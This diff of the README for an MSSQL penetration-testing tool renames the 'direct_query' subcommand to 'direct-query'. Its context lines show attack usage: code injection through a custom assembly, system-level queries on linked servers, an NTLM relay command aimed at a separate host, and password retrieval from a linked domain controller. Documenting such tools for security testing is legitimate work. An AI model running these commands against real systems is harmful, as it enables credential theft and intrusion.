@@ -55,7 +55,7 @@ This tool is designed for security professionals and researchers for testing pur
 - `run_query_system_service` procedure executing queries using custom assembly on local server or on linked servers as system user
 - `inject-custom-asm` Inject code using custom assembly on local server or on linked servers (You can use modify the following [DLL Example](https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/playbooks/custom-asm/Inject.cs).
 6. Direct Queries 
-- `direct_query` Execute direct queries on local server or on linked servers
+- `direct-query` Execute direct queries on local server or on linked servers
 
 
 ## Lateral Movement and Chain Exploration:
@@ -116,7 +116,7 @@ python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 
 # Executing direct query
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct_query "SELECT CURRENT_USER"
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"
 
 # Retrieving password from the linked server DC01
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
